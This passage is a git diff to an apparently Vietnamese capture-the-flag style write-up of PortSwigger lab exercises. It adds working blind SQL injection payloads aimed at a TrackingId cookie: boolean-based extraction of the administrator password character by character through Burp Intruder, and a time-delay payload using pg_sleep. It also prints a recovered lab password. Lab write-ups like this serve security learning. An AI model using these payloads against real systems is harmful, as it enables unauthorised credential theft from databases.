@@ -77,7 +77,17 @@ author: ['default']
 - Bây giờ chỉ login vào nữa :> 
 
 **[11.Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)**
-- 
+- Truy cập trang web -> chọn bất kì 1 category và bật interception burosuite
+![image](https://user-images.githubusercontent.com/61643034/209454680-d4ae355a-30ee-4c48-8c2b-8a057e48a4d4.png)
+- Theo gợi ý, mình sẽ chỉnh sửa phần TrackingID với payload ```TrackingId=abcxyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=$hehe$)='a``` -> ném cái này vào intruder để xem độ dài của password -> lenght=20
+- Sau đó dùng payload sau để kiểm tra từng kí tự của password ```TrackingId=xyz' AND (SELECT SUBSTRING(password,$position$,1) FROM users WHERE username='administrator')='$a$``` với vị trí bruteforce số 1 để từ ***1-20***, còn với vị trí 2 để list là **a-z và 0-9**. 
+- Để Grep match case là "Welcome back" -> thu về password là ```qqdl6qgmenyo3fdkcpst```
+- Vào login với account administrator là done :>
+
+**[13.Blind SQL injection with time delays](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)**
+- Theo gợi ý, mình sẽ chỉnh sửa phần TrackingID với payload trong repeater ```TrackingId=x'||pg_sleep(10)--``` -> send -> done 🫀
+
+**[Bài 12 và 14 làm tương tự các bước bài 11+13]
 
 **[17.SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
 ![image](https://user-images.githubusercontent.com/61643034/209040423-3270052e-3a07-4225-9431-70a5c5d6b9cc.png)**
